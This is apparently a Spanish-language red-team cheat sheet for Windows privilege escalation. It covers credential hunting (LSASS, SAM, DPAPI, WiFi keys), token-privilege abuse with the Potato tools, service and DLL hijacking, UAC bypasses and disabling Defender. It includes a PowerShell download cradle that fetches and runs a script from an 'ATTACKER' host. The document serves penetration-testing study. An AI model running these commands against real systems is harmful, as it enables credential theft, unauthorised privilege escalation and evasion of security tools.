---
aliases:
  - "Reading the user's Powershell history"
  - "reuse credentials"
  - "AutoLogon Credentials"
  - "Abusing Server Operators Group"
  - "Service Binary Path Hijacking"
  - "sc.exe"
  - "Abusing Printer"
  - "Abusing AlwaysInstallElevated"
  - "Lolbins Binary"
  - "Icacls Abuse"
  - "runas savecred"
  - "Abusing SeBackupPrivilege"
  - "PowerShell Download Cradle"
  - "Powershell Credentials Manipulation"
  - "Process execution as another user"
  - "Windows Defender Evasion"
  - "Abusing Scheduled Tasks"
  - "Windows-Exploit-Suggester"
  - "Checklist - Windows Enumeration & Privilege Escalation"
  - "Windows PrivEsc"
  - "WinPE"
  - "WPE"
  - "Windows System & Architecture Enumeration"
  - "Windows User & Group Enumeration"
  - "Windows Network & Interface Enumeration"
  - "Windows Process & Service Enumeration"
  - "Windows AV & EDR Identification"
  - "Windows Sensitive File Hunting"
  - "Exploiting Weak Service Permissions"
  - "Exploiting Unquoted Service Paths"
  - "Exploiting AlwaysInstallElevated"
  - "Exploiting Scheduled Tasks"
  - "DLL Hijacking & Path Interception"
  - "Abusing SeImpersonate & SeAssignPrimaryToken"
  - "Abusing SeDebugPrivilege"
  - "Abusing SeBackup & SeRestore"
  - "Abusing SeTakeOwnership"
  - "Abusing SeLoadDriver"
  - "Abusing DnsAdmins"
  - "Abusing Backup Operators"
  - "Abusing Server Operators"
  - "Abusing Hyper-V Administrators"
  - "Abusing Print Operators"
  - "Abusing Event Log Readers"
  - "Windows Kernel Exploits Detection"
  - "Bypassing Credential Guard"
  - "Living Off The Land (LOLBAS, GTFOBins)"
  - "AV & EDR Bypasses"
  - "AV & EDR Obfuscation"
  - Windows PrivEsc
  - WinPE
  - WPE
tags:
  - env/windows
  - technique/privilege-escalation
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Privilege Escalation]]"
kind: Concept
linked:
  - "[[Windows PrivEsc Payloads]]"
  - "[[Windows Post-Explotación]]"
  - "[[LSASS Dumping]]"
  - "[[Windows Event Logs]]"
  - "[[PrivEsc Enumeration Tools]]"
  - "[[PowerView]]"
  - "[[evil-winrm]]"
  - "[[Metasploit Framework]]"
---
# Windows Privilege Escalation

---

## Overview

Roadmap de escalada en Windows host. Orden sugerido: **enum automatizada → token privileges → misconfig servicios / path / registry → kernel exploits al final**.

Contexto inicial asumido: shell como user estándar (RDP, WinRM, webshell, SSH, reverse shell).

> Regla: `whoami /all`, `systeminfo`, `net user`, `net localgroup administrators`, `net user $env:USERNAME /domain` antes de nada.

---

## 1. Enumeración automatizada

- `winPEAS.exe` / `winPEAS.bat` — cobertura integral, colorea por prob. de éxito.
- `PowerUp.ps1` (PowerSploit) — clásico, foco en servicios y registry.
- `Seatbelt.exe` — recon pasivo silencioso.
- `Watson.exe` / `Sherlock.ps1` — sugerencia de exploits por KB faltante.
- `Windows Exploit Suggester - Next Generation` (`wes.py`) — match de `systeminfo` vs CVE DB.
- `accesschk.exe /accepteula` — chequear permisos sobre archivos/servicios.

## 2. Credenciales y secretos en disco

- `cmdkey /list` — credentials almacenadas, usar con `runas /savecred`.
- `dir /s *pass* *cred* *.config *.xml` — config files típicos.
- `sysprep.xml`, `unattend.xml`, `autounattend.xml`, `unattend.txt` — creds plain/base64.
- `C:\Windows\Panther\` — logs de instalación con creds.
- `c:\inetpub\wwwroot\web.config`, `appsettings.json`, `.env` — app creds.
- `C:\Windows\System32\config\` (requiere SYSTEM) — SAM, SYSTEM, SECURITY hives.
- **LSASS dump** — [[LSASS Dumping]]. `procdump -ma lsass.exe`, `comsvcs.dll` MiniDump.
- **DPAPI** — `mimikatz dpapi::cred`, `SharpDPAPI`.
- **Browser creds** — Chrome `Login Data`, Firefox `logins.json` + `key4.db`, Edge.
- **WiFi** — `netsh wlan show profile`, `netsh wlan show profile "SSID" key=clear`.
- **Powershell history** — `(Get-PSReadlineOption).HistorySavePath`.
- **KeePass/RDP/PuTTY** — `.kdbx`, `.rdp`, registry `Software\SimonTatham\PuTTY\Sessions`.

## 3. Token privileges

- `whoami /priv` → identificar privs explotables.
- **SeImpersonatePrivilege** / **SeAssignPrimaryTokenPrivilege** → Potato family:
  - **JuicyPotato** (legacy, <Server 2019).
  - **RoguePotato** / **PrintSpoofer** (Server 2019+).
  - **GodPotato** (hasta Server 2022).
  - **EfsPotato** / **SharpEfsPotato**.
- **SeBackupPrivilege** / **SeRestorePrivilege** → volcar SAM/SYSTEM vía `reg save`, o leer cualquier archivo.
- **SeDebugPrivilege** → inyectar en procesos SYSTEM, dump LSASS.
- **SeTakeOwnershipPrivilege** → tomar ownership, setear DACL, leer/escribir.
- **SeLoadDriverPrivilege** → cargar driver vulnerable firmado (`Capcom.sys`, `dbutil_2_3.sys`).
- **SeManageVolumePrivilege** → escritura arbitraria (hoy vía `SeManageVolumeExploit`).

## 4. Servicios mal configurados

- **Unquoted Service Path** — `wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """` → binary planting.
- **Weak service permissions** — `accesschk.exe -uwcqv user service_name` → `sc config svc binPath= "C:\evil.exe"` → `sc start svc`.
- **Weak binary permissions** — servicio apunta a .exe escribible.
- **Weak registry permissions** — `HKLM\SYSTEM\CurrentControlSet\Services\<svc>` con `ImagePath` editable.
- **DLL Hijacking** — `Process Monitor` → detectar `NAME NOT FOUND` sobre DLLs → plantar en primer dir del PATH.

## 5. Programados y startup

- **Scheduled tasks** — `schtasks /query /fo LIST /v` → tareas corriendo como SYSTEM/admin con script editable.
- **Startup apps** — `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`, `HKCU\...\Run`, `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\`.
- **AlwaysInstallElevated** — `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` + HKLM → `msiexec /quiet /qn /i evil.msi` corre SYSTEM.

## 6. Kernel / binario firmado vulnerable (BYOVD)

- `systeminfo` → versión + hotfixes instalados → `wes.py` / `Watson`.
- Exploits históricos: **MS16-032** (secondary logon), **MS17-010** (EternalBlue SMBv1), **MS14-058** (Win32k tracker), **CVE-2020-0787** (BITS), **CVE-2021-36934** (HiveNightmare/SeriousSAM).
- BYOVD clásicos: `Capcom.sys`, `dbutil_2_3.sys` (Dell), `gdrv.sys` (Gigabyte), `RTCore64.sys` (MSI Afterburner).
- **Último recurso** — puede crashear el host y alertar EDRs.

## 7. Permisos FS en archivos críticos

- `C:\Windows\System32\config\SAM`, `SYSTEM`, `SECURITY` — SeBackup o HiveNightmare.
- `C:\Windows\System32\drivers\*` — plantar driver si hay SeLoadDriver.
- `C:\ProgramData\*` — escribible por users, a veces ejecutado por services.
- **Shadow Copies** — `vssadmin list shadows` → copiar SAM/NTDS desde snapshot.

## 8. Active Directory pivot (si en dominio)

Si el host está unido a dominio, escalada local puede no ser necesaria — atacar directo el dominio. Hub: [[Active Directory Explotación]].

- **LAPS** — `ms-Mcs-AdmPwd` legible con user con GenericRead sobre computer object.
- **GPP Passwords** (legacy) — `groups.xml` en `SYSVOL` con cpassword descifrable.

## 9. UAC bypass (medium → high integrity)

- `whoami /groups | findstr Mandatory` → ver integrity level actual.
- **Fodhelper**, **ComputerDefaults**, **sdclt**, **wsreset**, **slui** — auto-elevate binaries + registry hijack en `HKCU\Software\Classes\...\shell\open\command`.
- **UACMe** (hfiref0x) — ~70 técnicas catalogadas.
- **SilentCleanup** — scheduled task con auto-elevate abusando de variables env.

## 10. EDR / AV bypass (complementario)

- AMSI bypass — [[AMSI Bypasses]].
- Defender bypass — obfuscación, AMSI patching, `Set-MpPreference -DisableRealtimeMonitoring $true` (requiere admin, útil post-escalada).
- LOLBAS — [[Windows LOTL Port Scanning]] y catálogo [lolbas-project.github.io](https://lolbas-project.github.io/).

---

## Checklist de triage inicial

```powershell
whoami /all
whoami /priv
systeminfo
net user
net localgroup administrators
net session
net start
sc query state= all
tasklist /v /fo list
schtasks /query /fo LIST /v
cmdkey /list
reg query "HKCU\Software\Microsoft\Terminal Server Client\Default"
Get-ChildItem -Path C:\ -Include *.config,*.xml,*.ini -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|secret"
Get-LocalGroup
dir /s /b C:\Users\*.kdbx C:\Users\*.rdp 2>/dev/null
```

PowerShell oneliner downloads:
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/winPEAS.ps1')
```

---

## Recursos

- [HackTricks - Windows PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings - Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [[Windows PrivEsc Payloads]] — payloads listos para lanzar.
- [[Windows Post-Explotación]] — qué hacer después.

---
